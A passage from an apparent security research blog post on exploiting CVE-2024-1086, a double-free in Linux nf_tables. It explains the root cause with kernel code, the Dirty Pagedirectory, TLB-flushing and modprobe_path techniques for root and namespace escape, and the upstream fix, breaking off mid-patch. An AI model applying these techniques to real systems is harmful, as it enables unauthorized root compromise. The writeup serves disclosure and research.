| Linux  | v6.2.?         | Ubuntu    | Jammy v6.2.0-37   | working      | AMD Ryzen 5 7640U | 6         | 32GiB    | n/a                                                                                   | final       |                                                                                                                                          |
| Linux  | v6.2.16        | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.2.16.config                |
| Linux  | v6.3.13        | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.3.13.config                |
| Linux  | v6.4.16        | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page->_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.4.16.config                |
| Linux  | v6.5.3         | Ubuntu    | Jammy v6.5.0-15   | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page->_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-ubuntu-jammy-v6.5.0-15.config         |
| Linux  | v6.5.13        | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page->_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.5.13.config                |
| Linux  | v6.6.14        | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page->_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.6.14.config                |
| Linux  | v6.7.1         | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [CODE] nft verdict value incorrect is altered by kernel                               | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.7.1.config                 |
```

Table 0.2.1: An overview of the exploit test results per tested kernel versions and their setups.

## 1. Overview

### 1.1. Abstract

In this blogpost I present several novel techniques I used to exploit a 0-day double-free bug in hardened Linux kernels (i.e. KernelCTF mitigation instances) with 93%-99% success rate. The underlying bug is input sanitization failure of netfilter verdicts. Hence, the requirements for the exploit are that nf\_tables is enabled and unprivileged user namespaces are enabled. The exploit is data-only and performs an kernel-space mirroring attack (KSMA) from userland with the novel Dirty Pagedirectory technique (pagetable confusion), where it is able to link any physical address (and its permissions) to virtual memory addresses by performing *just* read/writes to userland addresses.

### 1.2. Workflow

To trigger the bug leading to the double-free, I add a Netfilter rule to an unprivileged-user namespace. The Netfilter rule contains an expression which sets a malicious verdict value, which will make the internal nf\_tables kernel code interpret `NF_DROP` at first, after which it will free the skb, and then return `NF_ACCEPT` so the packet handling continues, and it will double-free the skb. Then, I trigger this rule by allocating an 16-page IP packet (so that it gets allocated by the buddy-allocator and not the PCP-allocator or slab-allocator, and it shares a cache across CPUs) which has migratetype 0.

In order to delay the 2nd free (so I can avoid corruption by doing stuff), I abuse the IP fragmenation logic of an IP packet. This allows us to make an skb "wait" in an IP fragmentation queue without being freed for an arbitrary amount of seconds. In order to traverse this code path with corrupted packet metadata, I spoof IP source address 1.1.1.1 and destination address 255.255.255.255. However, this means we get to deal with Reverse Path Forwarding (RPF), so we need to disable it in our networking namespace (does not require root privileges).

To achieve unlimited R/W to any physical memory address (including kernel addresses), I present the Dirty Pagedirectory technique. This technique is - softly said - pagetable confusion, by allocating an PTE page and PMD page to the same physical page.

Unfortunately, these pagetable pages are `migratetype==0 order==0` pages allocated with `alloc_pages()`, and skb heads (the double-free'd objects) are allocated with kmalloc, which means the slab-allocator is used for page `order<=1`, the PCP-allocator is used for `order<=3`, and the buddy-allocator for `order>=4`. To avoid hassle (explained in detail in the blogpost), we have to use `order>=4` pages for the double-free. This also means we cannot directly use a double-free on buddy-allocator pages (`order>=4`) to double allocate PTE/PMD pages (`order==0`), but I discovered methods to achieve this.

To double allocate PTE/PMD pages with the kmalloc-based double-free, I present 2 methods:

**The better page conversion technique (PCP draining)**
In this simpler, more stable, and faster method we take advantage of the fact that the PCP-allocator is simply a per-CPU freelist, which is refilled with pages from the buddy-allocator when it is drained. Hence, we can simply free `order==4` (16) pages to the buddy-allocator freelist, drain the PCP list, and refill the `order==0` PCP list with 64 pages from the buddy-allocator freelist, containing said 16 pages.

**The original page conversion technique (racecondition)**
This method relies on a race-condition and hence only works in virtualized environments such as QEMU VMs, where terminal IO causes a substantial delay in the VMs kernel. We take advantage of a WARN() message which causes ~50-300ms delay to trigger a race condition, to free an `order==4` buddy page to an `order==0` PCP freelist. As you may notice, this does not work on real hardware (as the delay is ~1ms) and is therefore replaced with the method above. Unfortunately, I used this technique for the original kernelctf exploit.

Between the double-free, I make sure the page refcounts never go to 0 since it would deny freeing the page (possibly as a double-free mitigation). Additionally, I spray skb objects into the `skbuff_head_cache` slabcache of the same CPU to avoid experimental freelist corruption detection in the kernelctf mitigation instance, and to increase stability in general.

When the double-free primitive is achieved, I will use a new technique called Dirty Pagedirectory to achieve unlimited read/write to any physical address. This requires double-allocating a page table entry (PTE) page and a page middle directory (PMD) page to the same address. When writing an arbitrary PTE value containing page permissions and page physical address to a page within the span of the PTE page, the PMD page will interpret said address when trying to dereference the PTE value's page within the PMD pages' span. This boils down to setting a PTE value to `0xDEADBEEF` entirely from userland, and then dereference that PTE value from userland again to access the page referenced to by `0xDEADBEEF` using the flags (including but not limited to permissions) set in `0xDEADBEEF`.

In order to utilize this unlimited R/W primitive, we need to flush the TLB. After reading several impractical research papers I came up with my own complex flushing algorithm to flush TLBs in Linux from userland: calling fork() and munmap()'ing the flushed VMA. In order to avoid crashes when the child exits the program, I make the child thread go to sleep indefinitely.

I utilize this unlimited physical memory access to bruteforce physical KASLR (which is accelerated because the physical kernel base is aligned with `CONFIG_PHYSICAL_START` (a.k.a. `0x100'0000` / 16MiB) or - when defined - `CONFIG_PHYSICAL_ALIGN` (a.k.a. `0x20'0000` / 2MiB) and leak the physical kernel base address by checking 2MiB worth of pages on a machine with 8GiB memory (assuming 16MiB alignment), which even fits into the area of a single overwritten PTE page. To detect the kernel, I used the [get-sig](https://github.com/notselwyn/get-sig) scripts which generate a highly precise fingerprint of files, like recent Linux kernels across compilers, and slapped that into my exploit.

In order to find `modprobe_path`, I do a fairly simplistic `"/sbin/modprobe" + "\x00" * ...` memory scan across 80MiB beyond the detected kernel base to get access to `modprobe_path`. To verify that the "real" `modprobe_path` variable was found instead of a false-positive, I overwrite `modprobe_path` and check if `/proc/sys/kernel/modprobe` (read-only user interface for `modprobe_path`) reflects this change. If `CONFIG_STATIC_USERMODEHELPER` is enabled, it will just check for `"/sbin/usermode-helper"`.

In order to drop a root shell (including an namespace escape) I overwrite `modprobe_path` or `"/sbin/usermode-helper"` to the exploits' memfd file descriptor containing the privesc script, such as `/proc/<pid>/fd/<fd>`. This fileless approach allows the exploit to be ran on an entire read-only filesystem (it being bootstrapped using perl). The PID has to be bruteforced if the exploit is running in a namespace - because the exploit only knows the namespace PID - but is luckily incredibly fast since we don't need to flush the TLB as we aren't changing the physical address of the PTE. This will essentially be writing the string to a userland address and executing a file.

In the privesc script, we will execute a `/bin/sh` process (as root) and hook the exploits' file descriptors (`/dev/<pid>/fd/<fd>`) to the shells' file descriptors, allowing us to achieve a namespace escape. The advantage of this method is that it's very versatile, as it works on local terminals and reverse shells, all without depending on filesystems and other forms of isolation.

## 2. Background info

### 2.1. nf\_tables

One of the in-tree Linux kernel modules is `nf_tables`. In recent versions of `iptables` - which is one of the most popular firewall tools out there - the `nf_tables` kernel module is the backend. `iptables` itself is part of the `ufw` backend. In order to decide which packets will pass the firewall, nftables uses a state machine with user-issued rules.

#### 2.1.1. Netfilter Hierarchy

These rules come in the following orders (i.e. one table contains many chains, one chain contains many rules, one rule contains many expressions):

* Tables (which protocol)
* Chains (which trigger)
* Rules (state machine functions)
* Expressions (state machine instructions)

![](https://pwning.tech/content/images/2024/02/nf_tables-4.svg)

Illustration 2.1.1.1: Nftables hierarchy overview of tables, chains, rules and expressions.

This allows users to program complex firewall rules, because nftables has many atomic expressions which can be chained together in rules to filter packets. Additionally, it allows chains to be ran at different times in the packet processing code (i.e. before routing and after routing) which can be selected when creating a chain using flags like `NF_INET_LOCAL_IN` and `NF_INET_POST_ROUTING`. Due to this extremely customizable nature, nftables is known to be incredibly insecure. Hence, many vulnerabilities have been reported and have been fixed already.

To learn more about nftables, I recommend this blogpost by @pqlqpql which goes into the deepest trenches of nftables: ["How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf\_tables."](https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/)

#### 2.1.2. Netfilter Verdicts

More relevant to the blogpost are Netfilter verdicts. A verdict is a decision by a Netfilter ruleset about a certain packet trying to pass the firewall. For example, it may be a drop or an accept. If the rule decides to drop the packet, Netfilter will stop processing the packet. On the contrary, if the rule decides to accept the packet, Netfilter will continue processing the packet until the packet passes all rules. At the time of writing, all the verdicts are:

* NF\_DROP: Drop the packet, stop processing it.
* NF\_ACCEPT: Accept the packet, continue processing it.
* NF\_STOLEN: Stop processing, the hook needs to free it.
* NF\_QUEUE: Let userland application process it.
* NF\_REPEAT: Call the hook again.
* NF\_STOP (deprecated): Accept the packet, stop processing it in Netfilter.

### 2.2. sk\_buff (skb)

To describe network data (including IP packets, ethernet frames, WiFi frames, etc.) the Linux kernel uses the sk\_buff structure and commonly calls them skb's as shorthand. To represent a packet, the kernel uses 2 objects which are important to us: the `sk_buff` object itself which contains kernel meta-data for skb handling, and the `sk_buff->head` object which contains the actual packet content like the IP header and the IP packets' body.

![](https://pwning.tech/content/images/2024/02/sk_buff_struct-4.svg)

Illustration 2.2.1: Overview of the sk\_buff structure's data buffer and its length field.

In order to use values from the IP header (since IP packets are parsed in the kernel afterall), the kernel does type punning with IP header struct and the `sk_buff->head` object using `ip_hdr()`. This pattern gets applied across the kernel since it allows for quick header parsing. As a matter of fact, the type punning trick is also used to parse ELF headers when executing a binary.

To learn more, check this excelent Linux kernel documentation page: ["struct sk\_buff - The Linux Kernel."](https://docs.kernel.org/networking/skbuff.html)

### 2.3. IP packet fragmentation

One of the features of IPv4 is packet fragmentation. This allows packets to be transmitted using multiple IP fragments. Fragments are just regular IP packets, except that they do not contain the full packet size specified in its IP header and it having the `IP_MF` flag set in the header.

The general calculation for the IP packet length in an IP fragments' header is `iph->len = sizeof(struct ip_header) * frags_n + total_body_length`. In the Linux kernel, all fragments for a single IP packet are stored into the same red-black tree (called an IP frag queue) until all fragments have been received. In order to filter out which fragment belongs at which offset when reassembling, the IP fragment offset is required: `iph->offset = body_offset >> 3`, whereby `body_offset` is the offset in the final IP body, and thus excluding any IP header lengths which may be used when calculating `iph->len`. As you may notice, fragment data has to be aligned with 8 bytes because the specs specify that the upper 3 bits of the offset field are used for flags (i.e. `IP_MF` and `IP_DF`). If we want to transmit 64 bytes of data across 2 fragments whose size are respectively 8 bytes and 56 bytes, we should format it like the code below. The kernel would then reassemble the IP packet as 'A' \* 64.

```
iph1->len = sizeof(struct ip_header)*2 + 64;
iph1->offset = ntohs(0 | IP_MF); // set MORE FRAGMENTS flag
memset(iph1_body, 'A', 8);
transmit(iph1, iph1_body, 8);

iph2->len = sizeof(struct ip_header)*2 + 64;
iph2->offset = ntohs(8 >> 3); // don't set IP_MF since this is the last packet
memset(iph2_body, 'A', 56);
transmit(iph2, iph2_body, 56);
```

Codeblock 2.3.1: C psuedocode describing the IP header format of IP fragments.

To learn more about packet fragmentation, check this blogpost by PacketPushers: ["IP Fragmentation in Detail."](https://packetpushers.net/ip-fragmentation-in-detail/)

### 2.4. Page allocation

There are 3 major ways to allocate pages in the Linux kernel: using the slab-allocator, the buddy-allocator and the per-cpu page (PCP) allocator. In short: the buddy-allocator is invoked with `alloc_pages()`, can be used for any page order (0->10), and allocates pages from a global pool of pages across CPUs. The PCP-allocator is also invoked with `alloc_pages()`, and can be used to allocate pages with order 0->3 from a per-CPU pool of pages. Additionally, there's the slab-allocator, which is invoked with `kmalloc()` and can allocate pages with order 0->1 (including smaller allocations) from specialized per-CPU freelists/caches.

The PCP-allocator exists because the buddy-allocator locks access when a CPU is allocating a page from the global pool, and hence blocks another CPU when it wants to allocate a page. The PCP-allocator prevents this by having a smaller per-CPU pool of pages which are allocated in bulk by the buddy-allocator in the background. This way, the chance of page allocation blockage is smaller.

![](https://pwning.tech/content/images/2024/02/pageallocatorbailywick.svg)

Illustration 2.4.1: Overview of available page allocators per order.

![](https://pwning.tech/content/images/2024/02/pageallocations-3.svg)

Illustration 2.4.2: Activity diagram of the page allocation process, starting from kmalloc().

To learn more about the buddy-allocator and the PCP-allocator, check the Page Allocation section of this extensive analysis: ["Reference: Analyzing Linux kernel memory management anomalies."](https://gitlab.com/gitlab-com/gl-infra/scalability/-/issues/2387#user-content-page-allocator)

### 2.5. Physical memory

#### 2.5.1. Physical-to-virtual memory mappings

One of the most fundamental elements of the kernel is memory management. When we are talking about memory, we could be talking about 2 types of memory: physical memory and virtual memory. Physical memory is what the RAM chips use, and virtual memory is how programs (including the kernel) running on the CPU interact with the physical memory. Of course when we use gdb to debug a binary, all addresses we use are virtual - since gdb and the underlying program is such a program as well.

Essentially, virtual memory is built on top of physical memory. The advantage of this model is that the virtual address range is larger than the physical address range - since empty virtual memory pages can be unmapped - which is good for ASLR efficiency among other things. Additionally, we can map 1 physical page to many virtual pages, or let there be an illusion that there are 128TiB addresses whilst in practice most of these are not backed by an actual page.

This means that we can work with 128TiB virtual memory ranges per process on a system with only 4GiB of physical memory. In theory, we could even map a single physical page of 4096 `\x41` bytes to all 128TiB worth of userland virtual pages. When a program wants to write a `\x42` byte to a virtual page, we perform copy-on-write (COW) and create a 2nd physical page and map that page to just the virtual page that the program wrote to.

![](https://pwning.tech/content/images/2024/02/phys_virt_mem-1.svg)

Illustration 2.5.1.1: Mappings between virtual and physical memory pages.

In order to translate virtual memory addresses to physical memory addresses, the CPU utilizes pagetables. So when our userland program tries to read (virtual memory) address `0xDEADBEEF`, the CPU will essentially do `mov rax, [0xDEADBEEF]`. However, in order to actually read the value from the RAM chips, the CPU needs to convert the virtual memory address `0xDEADBEEF` to an physical memory address.

This translation is oblivious to the kernel and our userland program when it is trying to access a virtual memory address. To perform this translation, the CPU performs a lookup in the Translation Lookaside Buffer (TLB) - which exists in the MMU - which caches the virtual-to-physical address translations. If the virtual `0xDEADBEEF` address (or more specifically, the virtual `0xDEADB000` page) has been recently accessed, the TLB does not have to traverse the pagetables (the next section), and will have the physical address beloning to the virtual address in cache. Otherwise, if the address is not in the TLB cache, the TLB needs to traverse the pagetables to get the physical address. This will be covered in the next subsection.

To learn more about physical memory, check this excellent [memory layout page from a Harvards Operating Systems course](https://read.seas.harvard.edu/cs161/2023/doc/memory-layout/).

#### 2.5.2. Pagetables

When the TLB gets requested a physical address for a virtual address which is not in its cache, it performs a "pagewalk" to acquire the physical address of a virtual address. A pagewalk means traversing the pagetables, which are a few nested arrays, with the physical addresses in the bottom arrays.

> Note that the diagram below uses pagetable indices of 9 bits (because `2**9 = 512` pagetable values fit into a single page). Additionally, we are using 4-level pagetables here, but the kernel also supports 5-level, 3-level, et cetera.

![](https://pwning.tech/content/images/2024/03/pagetables_with_bits-1.webp)

Illustration 2.5.2.1: An example of virtual address to physical address translation.

> This model of nested arrays is used because it saves a lot of memory. Instead of allocating a huge array for 128TiB of virtual addresses, it instead divides it into several smaller arrays with each layer having a smaller bailiwick. This means that tables responsible for an unallocated area will not be allocated.

Traversing the pagetables is a very inexpensive process since it are essentially 4-5 array dereferences. The indices for these dereferences are - get ready to have your mind blown - embedded in the virtual address. This means that a virtual address is not an address, but pagetable indices with a prefixed canonical. This elegant approach allows for O(1) physical address retrieval, since array dereferences are O(1) and the bit shifting to recover for the index is O(1) as well. Unfortunately, pagetables would need to be traversed very often which would make even these array dereferences slow. Hence, the TLB is implemented.

In terms of practicality, the TLB needs to find the pagetables in physical memory to pagewalk them. The address for the root of the userland pagetable hierarchy (PGD) of **the running process** is stored in the privileged `CR3` register in the corresponding CPU core. 'Privileged' means that the register can only be accessed from kernelspace, as userland accesses will lead to a permission error. When the kernel scheduler makes the CPU switch to another process context, the kernel will set the `CR3` register to `virt_to_phys(current->mm->pgd)`.

To learn more about how the MMU finds the location of the pagetable hierarchy when the CPU needs to do a TLB lookup with cache miss, check the [Wikipedia page on control registers](https://en.wikipedia.org/wiki/Control_register).

### 2.6. TLB Flushing

TLB Flushing is the practice of, well, flushing the TLB. The translation lookaside buffer (TLB) caches translations between virtual addresses and physical addresses. This practice delivers a huge performance increase as the CPU doesn't have to traverse the pagetables anymore and can instead *lookaside* to the TLB.

When an virtual addresses' pagetable hierarchy changes in kernelspace, it needs to be updated in the TLB as well. This is invoked manually from the kernel by doing function calls in the same functions where the pagetables are changed. These functions "flush" the TLB, which empties the translation cache (possibly only for a certain address range) of the TLB. Then, the next the virtual address is accessed, the TLB will save the translation to the TLB cache.

However, sometimes we change the pagetables (and their virtual addresses) in exploits at times where that's not expected. An example of this is using a UAF write bug to overwrite a PTE. At that time, the TLB flushing functions in the kernel are not called, since we are not using the functions to change the page tables, which do invoke said functions. Hence, we need to flush the TLB indirectly from userland. Otherwise, the TLB would contain outdated cache entries. In the techniques section of this blogpost I present my own method of doing this.

To learn more about the TLB, check the Wikipedia article: ["Translation lookaside buffer - Wikipedia."](https://en.wikipedia.org/wiki/Translation_lookaside_buffer)

### 2.7. Dirty Pagetable

Dirty Pagetable is a novel technique presented by N. Wu, which boils down to overwriting PTEs in order to perform an KSMA attack. Their research paper presents 2 scenarios to overwrite PTEs: a double-free bug and an UAF-write bug. Both scenarios are supplemented with a practical example. The original paper is definitely worth a read considering I learned a lot from it.

![](https://pwning.tech/content/images/2024/02/dirtypagetable-3.svg)

Illustration 2.7.1: An high-level overview of the Dirty Pagetable technique.

However, there are a few critical topics out-of-scope in the original paper, which I try to include in this blogpost. An example of those topics is how pagetables work, TLB flushing, proof-of-concept code, the workings of physical KASLR, and the format of PTE values. Additionally, I present a variation on this technique (Dirty Pagedirectory) in this blogpost.

To learn more, check the original research paper by N. Wu: ["Dirty Pagetable: A Novel Exploitation Technique To Rule Linux Kernel."](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html)

### 2.8. Overwriting modprobe\_path

One of the more classical privilege escalation techniques is overwriting the `modprobe_path` variable in the kernel. The value of the variable is set to `CONFIG_MODPROBE_PATH` at compile-time, and is padded to `KMOD_PATH_LEN` bytes with nullbytes. Usually `CONFIG_MODPROBE_PATH` is set to "/sbin/modprobe" as that is the usual filepath for the modprobe binary.

The variable is used when a user is trying execute a binary with an unknown magic bytes header. For instance, the magic bytes of an ELF binary are `FE45 4C46` (a.k.a. ".ELF"). When executing the binary, the kernel will look for registered binary handlers which match said magic bytes. In the case of ELF, the ELF binfmt handler is selected. However when a registered binfmt is not recognized, modprobe will be invoked using the path stored in `modprobe_path` and it will [query for a kernel module](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1754) with the name `binfmt-%04x`, where `%04x` is the hex representation of the first 2 bytes in the file.

![](https://pwning.tech/content/images/2024/02/modprobe_path-4.svg)

Illustration 2.8.1: Analysis of the modprobe\_path privilege escalation technique.

To exploit this, we can overwrite the value of `modprobe_path` with a string of the path of a privilege escalation script (which gives /bin/sh root SUID for instance), and then invoke modprobe by trying to execute a file with an invalid format such as `ffff ffff`. The kernel will then run `/tmp/privesc_script.sh -q -- binfmt-ffff` as root, which allows us to run any code as root. This saves us the hassle of having to run kernel functions ourselves, and instead allows easy privesc by overwriting a string.

Somewhere along the line, the `CONFIG_STATIC_USERMODEHELPER_PATH` mitigation was introduced, which makes overwriting `modprobe_path` useless. The mitigation works by setting every executed binary's path to a busybox-like binary, which behaves differently based on the argv[0] filename passed. Hence, if we overwrite `modprobe_path`, only this argv[0] value would differ, which the busybox-like binary does not recognize and hence would not execute.

The exploit presented in this exploit works both with and without `CONFIG_STATIC_USERMODEHELPER_PATH`, because we can simply overwrite the read-only `"/sbin/usermode-helper"` string in kernel memory.

To learn more about the modprobe\_path technique, check this useful page on Github by user Smallkirby: ["modprobe\_path.md · smallkirby/kernelpwn."](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)

### 2.9. KernelCTF

KernelCTF is a program ran by Google with the intent of disclosing new exploitation techniques for (hardened) Linux kernels. It's also a great way to get an ethical bounty for any vulnerabilities you may have in the Linux kernel, as the bounties range from $21.337 anywhere up to $111.337 and even more, all depending on the scope of the vulnerability and if there are any novel techniques.

The major outlines are that there are 3 machine categories: LTS (long-term stable kernel hardened with existing mitigations), mitigation (kernel hardened with experimental mitigations on top of existing mitigations), and COS (container optimized OS). Each machine can be hacked once per version, and the researcher who hacked the machine first gets the reward. This means that if researcher A hacked LTS version 6.1.63, then researcher A and researcher B can still hack mitigation version 6.1.63. After the next version is released on the KernelCTF platform (typically after 2 weeks), both researcher A and researcher B can hack LTS version 6.1.65 again. However, the bug reported by researcher A for version 6.1.63 will most likely be fixed now, and would be treated like a duplicate anyways if it were to be exploited again.

In order to "hack" the KernelCTF machine, the researcher needs to read the `/flag` file in the root (jail host) namespace, which is only readable by the root user. As you may expect, this may require both a namespace sandbox (`nsjail`) escape as well as an privilege escalation to the root user. At the end of the day, this does not matter as long as the flag is captured.

To debug the environment, check the `local_runner.sh` script which the KernelCTF team provides. Note the `--root` flag, which allows you to run a root shell from outside of the jail.

To learn more about the KernelCTF program, check this page: ["KernelCTF rules | security-research."](https://google.github.io/security-research/kernelctf/rules.html)

## 3. The bug

### 3.1. Finding the bug

It all started when I wanted to implement firewall bypasses into my ORB rootkit [Netkit](https://github.com/Notselwyn/netkit). I wanted to rely on the kernel API (exported functions) for any actions, as it would have the same compatibility as regular kernel modules. Hopefully, this would mean that the rootkit kernel module could be used across architectures and kernel versions, without having to change the source code.

This led me into the rabbit hole called Netfilter. Before this research, I had no practical experience with Netfilter, so I had to do a lot of research on my own. Gladfully, there is plenty of documentation available from both the kernel developers and the infosec community. After reading myself into the subsystem, I read a bunch of source code from the top down related to nf\_tables rules and expressions.

While reading nf\_tables code - whose state machine is very interesting from a software development point of view - I noticed the `nf_hook_slow()` function. This function loops over all rules in a chain and stops evaluation (returns the function) immediately when `NF_DROP` is issued.

In the `NF_DROP` handling, it frees the packet and it allows a user to set the return value using `NF_GET_DROPERR()`. With this knowledge I made the function return `NF_ACCEPT` using the drop error when handling `NF_DROP`. A bunch of kernel panics and code path analyses later, I found a double-free primitive.

```
// looping over existing rules when skb triggers chain
int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state,
		 const struct nf_hook_entries *e, unsigned int s)
{
	unsigned int verdict;
	int ret;

	// loop over every rule
	for (; s < e->num_hook_entries; s++) {
		// acquire rule's verdict
		verdict = nf_hook_entry_hookfn(&e->hooks[s], skb, state);

		switch (verdict & NF_VERDICT_MASK) {
		case NF_ACCEPT:
			break;  // go to next rule
		case NF_DROP:
			kfree_skb_reason(skb, SKB_DROP_REASON_NETFILTER_DROP);

			// check if the verdict contains a drop err
			ret = NF_DROP_GETERR(verdict);
			if (ret == 0)
				ret = -EPERM;

			// immediately return (do not evaluate other rules)
			return ret;

		// [snip] alternative verdict cases
		default:
			WARN_ON_ONCE(1);
			return 0;
		}
	}

	return 1;
}
```

Codeblock 3.1.1: The `nf_hook_slow()` kernel function written in C, which iterates over nftables rules.

### 3.2. Root cause analysis

The root cause of the bug is quite simplistic in nature, as it is an input sanitization bug. The impact of this is a stable double-free primitive.

The important details of the dataflow analysis are that when creating a verdict **object** for a netfilter hook, the kernel allowed positive drop errors. This meant an attacking user could cause the scenario below, where `nf_hook_slow()` would free an skb object when `NF_DROP` is returned from a hook/rule, and then return `NF_ACCEPT` as if every hook/rule in the chain returned `NF_ACCEPT`. This causes the caller of `nf_hook_slow()` to misinterpret the situation, and continue parsing the packet and eventually double-free it.

```
// userland API (netlink-based) handler for initializing the verdict
static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
			    struct nft_data_desc *desc, const struct nlattr *nla)
{
	u8 genmask = nft_genmask_next(ctx->net);
	struct nlattr *tb[NFTA_VERDICT_MAX + 1];
	struct nft_chain *chain;
	int err;

	// [snip] initialize memory

	// malicious user: data->verdict.code = 0xffff0000
	switch (data->verdict.code) {
	default:
		// data->verdict.code & NF_VERDICT_MASK == 0x0 (NF_DROP)
		switch (data->verdict.code & NF_VERDICT_MASK) {
		case NF_ACCEPT:
		case NF_DROP:
		case NF_QUEUE:
			break;  // happy-flow
		default:
			return -EINVAL;
		}
		fallthrough;
	case NFT_CONTINUE:
	case NFT_BREAK:
	case NFT_RETURN:
		break;  // happy-flow
	case NFT_JUMP:
	case NFT_GOTO:
		// [snip] handle cases
		break;
	}

	// successfully set the verdict value to 0xffff0000
	desc->len = sizeof(data->verdict);

	return 0;
}
```

Codeblock 3.2.1: The `nft_verdict_init()` kernel function written in C, which constructs an netfilter verdict object.

```
// looping over existing rules when skb triggers chain
int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state,
         const struct nf_hook_entries *e, unsigned int s)
{
    unsigned int verdict;
    int ret;

    for (; s < e->num_hook_entries; s++) {
        // malicious rule: verdict = 0xffff0000
        verdict = nf_hook_entry_hookfn(&e->hooks[s], skb, state);

        // 0xffff0000 & NF_VERDICT_MASK == 0x0 (NF_DROP)
        switch (verdict & NF_VERDICT_MASK) {
        case NF_ACCEPT:
            break;
        case NF_DROP:
            // first free of double-free
            kfree_skb_reason(skb,
                     SKB_DROP_REASON_NETFILTER_DROP);

            // NF_DROP_GETERR(0xffff0000) == 1 (NF_ACCEPT)
            ret = NF_DROP_GETERR(verdict);
            if (ret == 0)
                ret = -EPERM;

            // return NF_ACCEPT (continue packet handling)
            return ret;

        // [snip] alternative verdict cases
        default:
            WARN_ON_ONCE(1);
            return 0;
        }
    }

    return 1;
}
```

Codeblock 3.2.2: The `nf_hook_slow()` kernel function written in C, which iterates over nftables rules.

```
static inline int NF_HOOK(uint8_t pf, unsigned int hook, struct net *net, struct sock *sk,
	struct sk_buff *skb, struct net_device *in, struct net_device *out,
	int (*okfn)(struct net *, struct sock *, struct sk_buff *))
{
	// results in nf_hook_slow() call
	int ret = nf_hook(pf, hook, net, sk, skb, in, out, okfn);

	// if skb passes rules, handle skb, and double-free it
	if (ret == NF_ACCEPT)
		ret = okfn(net, sk, skb);

	return ret;
}
```

Codeblock 3.2.3: The `NF_HOOK()` kernel function written in C, which calls a callback function on success.

### 3.3. Bug impact & exploitation

As said in the subsection above, this bug leaves us with a very powerful double-free primitive when the correct code paths are hit. The double-free impacts both `struct sk_buff` objects in the `skbuff_head_cache` slab cache, as well as a dynamically-sized `sk_buff->head` object ranging from `kmalloc-256` up to order 4 pages directly from the buddy-allocator (65536 bytes) with ipv4 packets (perhaps even more with ipv6 jumbo packets?).

The `sk_buff->head` object is allocated through a kmalloc-like interface (`kmalloc_reserve()`) in `__alloc_skb()`. This allows us to allocate objects of a dynamic size. Hence, we can allocate slab objects from size 256 to full-on pages of 65536 bytes from the buddy allocator. An functional overview of this can be found in the page allocaction subsection of the background info section.

The size of the sk\_buff->head object is directly influenced by the size of the network packet, as this object contains the packet content. Hence, if we send a packet with e.g. 40KiB data, the kernel would allocate an order 4 page directly from the buddy-allocator.

When you try to reproduce the bug yourselves, the kernel may panic, even when all mitigations are disabled. This is because certain fields of the skb - such as pointers - get corrupted when the skb is freed. As such, we should try to avoid usage of these fields. Fortunately, I found a way to bypass all usage which could lead to a panic or usual errors and get a highly reliable double-free primitive. I'm highlighting this in the respective subsection within the proof-of-concept section.

### 3.4. Bug fixes

When I reported the bug to the kernel developers, I proposed my own bug fix which regretfully had to introduce a specific breaking change in the middle of the netfilter stack.

Thankfully, one of the maintainers of the subsystem came up with their own elegant fix. Their fix sanitizes verdicts from userland input in the netfilter API itself, before the malicious verdict is even added. The specific fix makes the kernel disallow drop errors entirely for userland input. The maintainer mentions however that if this behaviour is needed in the future, only drop errors with `n <= 0` should be allowed to prevent bugs like these. This is because positive drop errors like `1` will overlap as `NF_ACCEPT`.

Additionally, the vulnerability was assigned [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086) (this was before the Linux kernel became an CNA and ruined the meaning of CVEs).

```
A use-after-free vulnerability in the Linux kernel's netfilter: nf_tables component can be exploited to achieve local privilege escalation.

The nft_verdict_init() function allows positive values as drop error within the hook verdict, and hence the nf_hook_slow() function can cause a double free vulnerability when NF_DROP is issued with a drop error which resembles NF_ACCEPT.

We recommend upgrading past commit f342de4e2f33e0e39165d8639387aa6c19dff660.
```

Codeblock 3.4.1: The description of CVE-2024-1086.

```
--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -10988,16 +10988,10 @@ static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
 	data->verdict.code = ntohl(nla_get_be32(tb[NFTA_VERDICT_CODE]));

 	switch (data->verdict.code) {
-	default:
-		switch (data->verdict.code & NF_VERDICT_MASK) {
-		case NF_ACCEPT:
-		case NF_DROP:
-		case NF_QUEUE:
-			break;
-		default:
-			return -EINVAL;
-		}
-		fallthrough;
+	case NF_ACCEPT:
